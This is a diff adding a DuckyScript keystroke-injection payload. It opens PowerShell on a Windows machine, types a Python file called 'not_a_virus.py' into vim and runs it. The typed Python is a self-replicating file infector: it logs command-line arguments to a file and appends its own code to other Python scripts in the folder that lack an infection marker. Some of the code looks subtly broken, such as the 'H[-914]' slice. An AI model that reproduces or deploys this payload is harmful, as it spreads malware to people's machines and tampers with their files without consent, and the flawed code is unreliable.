@@ -1,0 +1,67 @@
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+STRING vim not_a_virus.py
+DELAY 1000
+ENTER
+DELAY 1000
+STRING i
+DELAY 1000
+STRING B=open
+ENTER
+DELAY 1000
+STRING import os,sys
+ENTER
+DELAY 1000
+STRING def D(code):return'if __name__ == "__main__":'in code or"if __name__ == '__main__':"in code
+ENTER
+DELAY 1000
+STRING def E(code):return'ive infected you with c'in code
+ENTER
+DELAY 1000
+STRING if __name__=='__main__':
+ENTER
+DELAY 1000
+STRING F=os.listdir()
+ENTER
+DELAY 1000
+STRING with B('Q1C.out','a')as A:
+ENTER
+DELAY 1000
+STRING for G in sys.argv:A.write(G+' ')
+ENTER
+DELAY 1000
+STRING A.write('\n')
+ENTER
+DELAY 1000
+LEFT
+LEFT
+LEFT
+LEFT
+DELAY 1000
+STRING with B(__file__,'r')as A:H=A.read()
+ENTER 
+DELAY 1000
+STRING for A in F:
+ENTER
+DELAY 1000
+STRING with B(A,'r')as I:C=I.read()
+ENTER 
+DELAY 1000
+STRING if A.endswith('.py')and D(C)and not E(C):
+ENTER
+DELAY 1000
+STRING with B(A,'a')as J:J.write(H[-914])
+DELAY 1000
+ESCAPE
+DELAY 1000
+STRING :wq
+DELAY 1000
+ENTER
+DELAY 1000
+STRING python3 not_a_virus.py
+DELAY 1000
+ENTER
